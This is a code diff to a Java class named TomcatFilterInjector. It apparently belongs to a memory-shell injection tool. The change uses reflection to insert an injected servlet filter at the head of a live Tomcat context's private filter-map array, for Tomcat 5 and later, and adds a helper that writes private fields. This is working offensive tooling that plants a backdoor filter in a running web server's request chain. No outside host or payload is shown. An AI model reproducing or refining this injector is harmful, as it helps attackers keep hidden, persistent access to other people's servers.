@@ -4,6 +4,7 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
+import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -149,15 +150,18 @@ public class TomcatFilterInjector {
         }
         Object filterDef;
         Object filterMap;
+        Class<?> filterMapClass;
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
             // tomcat v8+
             filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
-            filterMap = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
+            filterMapClass = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
+            filterMap = filterMapClass.newInstance();
         } catch (Exception e2) {
             // tomcat v5+
             filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
-            filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
+            filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
+            filterMap = filterMapClass.newInstance();
         }
 
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
@@ -175,11 +179,17 @@ public class TomcatFilterInjector {
             // tomcat v5
             invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         }
+
+        // addFilterMapFirst
+        Object[] filterMaps = (Object[]) invokeMethod(context, "findFilterMaps", null, null);
+        Object[] results = (Object[]) Array.newInstance(filterMapClass, filterMaps.length + 1);
+        results[0] = filterMap;
+        System.arraycopy(filterMaps, 0, results, 1, filterMaps.length);
         try {
-            // v7.0.0 以上
-            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+            // Tomcat5
+            setFieldValue(context, "filterMaps", results);
         } catch (Exception e) {
-            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+            setFieldValue(getFieldValue(context, "filterMaps"), "array", results);
         }
 
         Constructor filterConfigConstructor;
@@ -258,6 +268,22 @@ public class TomcatFilterInjector {
                 Field field = clazz.getDeclaredField(name);
                 field.setAccessible(true);
                 return field.get(obj);
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                field.set(obj, value);
+                return;
             } catch (NoSuchFieldException var5) {
                 clazz = clazz.getSuperclass();
             }
